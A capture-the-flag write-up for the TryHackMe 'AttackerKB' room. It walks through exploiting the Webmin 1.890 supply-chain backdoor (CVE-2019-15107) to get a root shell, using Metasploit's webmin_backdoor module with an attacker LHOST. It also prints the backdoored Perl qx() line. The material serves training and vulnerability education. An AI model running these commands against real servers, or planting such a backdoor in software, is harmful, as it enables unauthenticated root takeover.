---
title: "AttackerKB"
description: "A boot2root CTF machine leveraging the Webmin 1.890 supply chain backdoor (CVE-2019-15107) to gain unauthenticated remote code execution as root."
difficulty: "Easy"
tags: ["Webmin", "Supply Chain", "CVE-2019-15107", "Metasploit", "RCE"]
date: "2026-07-04"
---

## Overview

AttackerKB is a TryHackMe room that teaches how to leverage the AttackerKB platform for researching exploits. The target runs Webmin 1.890, which was compromised in a supply chain attack — an unknown attacker inserted a backdoor into the `password_change.cgi` script. This allows unauthenticated command injection as root.

## Room Information

- **Platform:** TryHackMe
- **Difficulty:** Easy
- **Skills Learned:** Webmin enumeration, exploit research with AttackerKB, supply chain vulnerability exploitation

## Enumeration

### Nmap Scan

```bash
nmap -sV -sC -oN nmap.txt 10.49.168.190
```

Two open ports were discovered:

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 7.6p1 Ubuntu |
| 10000/tcp | HTTP | MiniServ 1.890 (Webmin httpd) |

### Webmin Discovery

Navigating to `https://10.49.168.190:10000` presented a Webmin login portal. The SSL certificate revealed the hostname `source`, which was added to `/etc/hosts`:

```bash
10.49.168.190  source
```

The service was identified as **Webmin 1.890** — a web-based system administration tool.

### Research with AttackerKB

The room's namesake platform, AttackerKB, was used to research vulnerabilities in this version. Searching for "Webmin password_change.cgi" revealed **CVE-2019-15107**, a critical unauthenticated remote command execution vulnerability affecting Webmin through version 1.920.

The backdoor was introduced via a **supply chain compromise** — an attacker breached Webmin's build server in April 2018 and inserted malicious Perl `qx()` statements into `password_change.cgi`. The timestamp was backdated to evade detection, and the tainted code was included in the official SourceForge release of version 1.890.

## Exploitation

### Metasploit

The Metasploit framework includes the `webmin_backdoor` module that exploits this vulnerability:

```bash
msfconsole
msf6 > use exploit/linux/http/webmin_backdoor
msf6 exploit(linux/http/webmin_backdoor) > set RHOSTS 10.49.168.190
msf6 exploit(linux/http/webmin_backdoor) > set LHOST <tun0_ip>
msf6 exploit(linux/http/webmin_backdoor) > set SSL true
msf6 exploit(linux/http/webmin_backdoor) > run
```

### Root Shell

The exploit succeeded immediately without authentication. The backdoored `password_change.cgi` script executes the `expired` POST parameter as a shell command via Perl's `qx()` operator:

```perl
$in{'expired'} eq '' || die $text{'password_expired'},qx/$in{'expired'}/;
```

This gave a root shell directly — no privilege escalation needed.

### User Flag

```bash
cat /home/dark/user.txt
```

### Root Flag

```bash
cat /root/root.txt
```

## Flags

| Flag | Location |
|------|----------|
| User | `/home/dark/user.txt` |
| Root | `/root/root.txt` |

## Commands Used

```bash
nmap -sV -sC -oN nmap.txt <target-ip>
msfconsole
use exploit/linux/http/webmin_backdoor
set RHOSTS <target-ip>
set LHOST <attacker-ip>
set SSL true
run
```

## Lessons Learned

- **Supply chain attacks** are insidious — even downloading software from the official source is not always safe. The Webmin backdoor went undetected for over a year because it was inserted into the build server itself, not the public source code.
- **AttackerKB** is a valuable resource for researching vulnerabilities and understanding exploit context, community assessments, and real-world applicability.
- **Webmin exposed on the internet** is extremely dangerous. The 1.890 backdoor gives unauthenticated root access to anyone who finds it.
- The **CVE-2019-15107** vulnerability was introduced in two separate incidents: once in the 1.890 release (April 2018) and again in releases 1.900 through 1.920 (July 2018). Only version 1.890 is exploitable in the default configuration.
- **Version enumeration** is critical — knowing the exact software version allows targeted exploit research rather than blind guessing.

## References

- [TryHackMe — AttackerKB](https://tryhackme.com/room/attackerkb)
- [AttackerKB — Webmin password_change.cgi](https://attackerkb.com/topics/hxx3zmiCkR/webmin-password-change-cgi-command-injection)
- [CVE-2019-15107 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2019-15107)
- [Metasploit — webmin_backdoor](https://www.rapid7.com/db/modules/exploit/linux/http/webmin_backdoor/)
- [Webmin Exploit Page](http://www.webmin.com/exploit.html)
